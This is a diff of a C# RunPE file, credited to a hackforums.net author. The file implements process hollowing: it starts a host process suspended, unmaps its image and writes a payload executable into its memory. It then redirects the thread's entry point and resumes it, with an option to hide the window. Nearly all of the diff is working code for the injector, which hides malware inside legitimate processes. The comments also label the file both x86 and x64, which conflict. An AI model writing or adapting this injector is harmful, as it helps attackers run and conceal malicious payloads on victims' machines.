@@ -1,5 +1,5 @@
 ﻿/*
- * WinX86.cs
+ * WinX64.cs
  * Created by gigajew @ www.hackforums.net
  * 
  * I put hours of work in to this, so please do leave these credits :)
@@ -10,15 +10,14 @@
 
 using System;
 using System.ComponentModel;
-using System.IO;
-using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
 using static HackForums.gigajew.WinXComponents;
 
 namespace HackForums.gigajew
 {
     /// <summary>
-    /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10
+    /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10 x86
     /// Please leave these credits as a reminder of all the hours of work put into this
     /// </summary>
     public static unsafe class WinX86
@@ -28,240 +27,133 @@ namespace HackForums.gigajew
             _IMAGE_DOS_HEADER* dosHeader;
             _IMAGE_NT_HEADERS* ntHeaders;
 
-            IntPtr pImageBase;
-            IntPtr pBuffer;
-
-            bool emulatedi386 = false;
-            string currentDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
+            IntPtr payloadImageBase;
+            IntPtr payloadBuffer;
 
             ProcessInfo processInfo;
             processInfo = new ProcessInfo();
 
+            StartupInfo startupInfo;
+            startupInfo = new StartupInfo();
+            startupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
+            if (parameters.Hidden)
+            {
+                startupInfo.wShowWindow = 0;
+                startupInfo.dwFlags = 0x00000001;
+            }
+
             _CONTEXT context = new _CONTEXT();
             context.ContextFlags = 0x10001b;
 
-            // get the address of buffer
-            fixed (byte* pBufferUnsafe = parameters.Payload)
-            {
-                pBuffer = (IntPtr)pBufferUnsafe;
-                dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
-                ntHeaders = (_IMAGE_NT_HEADERS*)(pBufferUnsafe + (dosHeader->e_lfanew));
-            }
+            IntPtr address = Marshal.AllocHGlobal(4);
+            IntPtr hToken = WindowsIdentity.GetCurrent().Token;
 
-            // security checks
-            if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
-            {
-                throw new Win32Exception("Not a valid Win32 PE! -gigajew");
-            }
+            IntPtr written = Marshal.AllocHGlobal(8);
+            bool emulatedi386 = false;
 
-            // check 32-bit
-            if (ntHeaders->OptionalHeader.Magic != 0x10b)
+            try
             {
-                throw new Exception("This RunPE only supports i386-built executables! -gigajew");
-            }
-
-            // patch (by Menalix/gigajew)
-            Buffer.SetByte(parameters.Payload, 0x398, 0x2);
-
-            // init
-            uint creationFlags = 0x00000004u | 0x00000008;
-            if (parameters.Hidden)
-            {
-                creationFlags |= 0x08000000u;
-            }
-
-            if (!CreateProcessInternal(0u, null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, currentDir, new byte[0], &processInfo, 0u))
-            {
-                if (processInfo.hProcess != IntPtr.Zero)
+                // get the address of buffer
+                fixed (byte* pBufferUnsafe = parameters.Payload)
                 {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-                    }
+                    payloadBuffer = (IntPtr)pBufferUnsafe;
+                    dosHeader = (_IMAGE_DOS_HEADER*)(pBufferUnsafe);
+                    ntHeaders = (_IMAGE_NT_HEADERS*)(pBufferUnsafe + (dosHeader->e_lfanew));
                 }
 
-                return false;
-            }
+                // security checks
+                if (dosHeader->e_magic != 0x5A4D || ntHeaders->Signature != 0x00004550)
+                    throw new Exception("Not a valid Win32 PE! -gigajew");
 
-            // check emulated i386
-            IsWow64Process(processInfo.hProcess, ref emulatedi386);
+                // check 32-bit
+                if (ntHeaders->OptionalHeader.Magic != 0x10b)
+                    throw new Exception("This RunPE only supports X86-built executables! -gigajew");
 
-            // unmap
-            pImageBase = (IntPtr)(ntHeaders->OptionalHeader.ImageBase);
-            NtUnmapViewOfSection(processInfo.hProcess, pImageBase); // we don't care if this fails
+                // init
+                uint creationFlags = 0x00000004u | 0x00000008u;
+                if (parameters.Hidden)
+                    creationFlags |= 0x08000000u;
 
-            // allocate
-            if (VirtualAllocEx(processInfo.hProcess, pImageBase, ntHeaders->OptionalHeader.SizeOfImage, 0x3000u, 0x40u) == IntPtr.Zero)
-            {
-                if (!TerminateProcess(processInfo.hProcess, -1))
-                {
+                // patch (by Menalix/gigajew)
+                Buffer.SetByte(parameters.Payload, 0x398, 0x2);
+
+                //if (!CreateProcessInternal(0, null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, Environment.CurrentDirectory, &startupInfo, &processInfo, 0))
+                //    throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                CreateProcess(null, parameters.GetFormattedHostFileName(), IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, Environment.CurrentDirectory, &startupInfo, &processInfo);
+
+                // todo: fix relocation addresses
+
+                // check emulated i386
+                IsWow64Process(processInfo.hProcess, ref emulatedi386);
+
+                // unmap existing section in the remote process
+                payloadImageBase = (IntPtr)(ntHeaders->OptionalHeader.ImageBase);
+                NtUnmapViewOfSection(processInfo.hProcess, payloadImageBase); // we don't care if this fails
+
+                // allocate
+                if (VirtualAllocEx(processInfo.hProcess, payloadImageBase, new UIntPtr(ntHeaders->OptionalHeader.SizeOfImage), 0x3000u, 0x40u) == IntPtr.Zero)
                     throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                // copy image headers
+                if (!WriteProcessMemory(processInfo.hProcess, payloadImageBase, payloadBuffer, new UIntPtr(ntHeaders->OptionalHeader.SizeOfHeaders), written))
+                    throw new Win32Exception(Marshal.GetLastWin32Error());
+
+                // copy sections
+                for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+                {
+                    _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(payloadBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));
+
+                    if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(payloadImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(payloadBuffer.ToInt64() + (section->PointerToRawData)), new UIntPtr(section->SizeOfRawData), written))
+                        throw new Win32Exception(Marshal.GetLastWin32Error());
+                }
+
+                // get thread context
+                if(emulatedi386 )
+                {
+                    if (!Wow64GetThreadContext(processInfo.hThread, &context))
+                        throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext");
+                } else
+                {
+                    if (!GetThreadContext(processInfo.hThread, &context))
+                        throw new Win32Exception(Marshal.GetLastWin32Error(), "GetThreadContext");
+                }
+              
+                // patch imagebase
+                Marshal.WriteInt64(address, payloadImageBase.ToInt64());
+                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Ebx  + 8ul), address, new UIntPtr(4u), written))
+                    throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory");
+
+                // patch ep
+                context.Eax  = (uint )(payloadImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));
+
+                // set context
+                if(emulatedi386 )
+                {
+                    if (!Wow64SetThreadContext(processInfo.hThread, &context))
+                        throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext");
                 }
                 else
                 {
-                    CloseHandle(processInfo.hProcess);
-                    CloseHandle(processInfo.hThread);
-
-                    return false;
+                    if (!SetThreadContext(processInfo.hThread, &context))
+                        throw new Win32Exception(Marshal.GetLastWin32Error(), "SetThreadContext");
                 }
+                
+                // resume thread
+                ResumeThread(processInfo.hThread);
+
             }
-
-            // copy image headers
-            if (!WriteProcessMemory(processInfo.hProcess, pImageBase, pBuffer, ntHeaders->OptionalHeader.SizeOfHeaders, IntPtr.Zero))
+            catch
             {
-                if (!TerminateProcess(processInfo.hProcess, -1))
-                {
-                    throw new Win32Exception(Marshal.GetLastWin32Error());
-                }
-                else
-                {
-                    CloseHandle(processInfo.hProcess);
-                    CloseHandle(processInfo.hThread);
-
-                    return false;
-                }
+                TerminateProcess(processInfo.hProcess, 0);
+                throw;
             }
-
-            // copy sections
-            for (ushort i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+            finally
             {
-                _IMAGE_SECTION_HEADER* section = (_IMAGE_SECTION_HEADER*)(pBuffer.ToInt64() + (dosHeader->e_lfanew) + Marshal.SizeOf(typeof(_IMAGE_NT_HEADERS)) + (Marshal.SizeOf(typeof(_IMAGE_SECTION_HEADER)) * i));
-
-                if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(pImageBase.ToInt64() + (section->VirtualAddress)), (IntPtr)(pBuffer.ToInt64() + (section->PointerToRawData)), section->SizeOfRawData, IntPtr.Zero))
-                {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-
-                        return false;
-                    }
-                }
-            }
-
-            // get thread context
-            if (emulatedi386)
-            {
-                if (!Wow64GetThreadContext(processInfo.hThread, &context))
-                {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-
-                        return false;
-                    }
-                }
-            }
-            else
-            {
-                if (!GetThreadContext(processInfo.hThread, &context))
-                {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-
-                        return false;
-                    }
-                }
-            }
-
-            // patch imagebase
-            IntPtr address = Marshal.AllocHGlobal(8);
-            ulong puImageBase = (ulong)pImageBase.ToInt64();
-            byte[] pbImageBase = new byte[8];
-            pbImageBase[0] = (byte)(puImageBase >> 0);
-            pbImageBase[1] = (byte)(puImageBase >> 8);
-            pbImageBase[2] = (byte)(puImageBase >> 16);
-            pbImageBase[3] = (byte)(puImageBase >> 24);
-            pbImageBase[4] = (byte)(puImageBase >> 32);
-            pbImageBase[5] = (byte)(puImageBase >> 40);
-            pbImageBase[6] = (byte)(puImageBase >> 48);
-            pbImageBase[7] = (byte)(puImageBase >> 56);
-
-            Marshal.Copy(pbImageBase, 0, address, 8);
-            if (!WriteProcessMemory(processInfo.hProcess, (IntPtr)(context.Ebx + 8ul), address, 4u, IntPtr.Zero))
-            {
+                CloseHandle(processInfo.hThread);
+                CloseHandle(processInfo.hProcess);
                 Marshal.FreeHGlobal(address);
-
-                if (!TerminateProcess(processInfo.hProcess, -1))
-                {
-                    throw new Win32Exception(Marshal.GetLastWin32Error());
-                }
-                else
-                {
-                    CloseHandle(processInfo.hProcess);
-                    CloseHandle(processInfo.hThread);
-
-                    return false;
-                }
             }
-
-            Marshal.FreeHGlobal(address);
-
-            // patch ep
-            context.Eax = (uint)(pImageBase.ToInt64() + (ntHeaders->OptionalHeader.AddressOfEntryPoint));
-
-            // set context
-            if (emulatedi386)
-            {
-                if (!Wow64SetThreadContext(processInfo.hThread, &context))
-                {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-
-                        return false;
-                    }
-                }
-            }
-            else
-            {
-                if (!SetThreadContext(processInfo.hThread, &context))
-                {
-                    if (!TerminateProcess(processInfo.hProcess, -1))
-                    {
-                        throw new Win32Exception(Marshal.GetLastWin32Error());
-                    }
-                    else
-                    {
-                        CloseHandle(processInfo.hProcess);
-                        CloseHandle(processInfo.hThread);
-
-                        return false;
-                    }
-                }
-            }
-
-            // resume thread
-            ResumeThread(processInfo.hThread);
-
-            // cleanup
-            CloseHandle(processInfo.hProcess);
-            CloseHandle(processInfo.hThread);
 
             return true;
         }
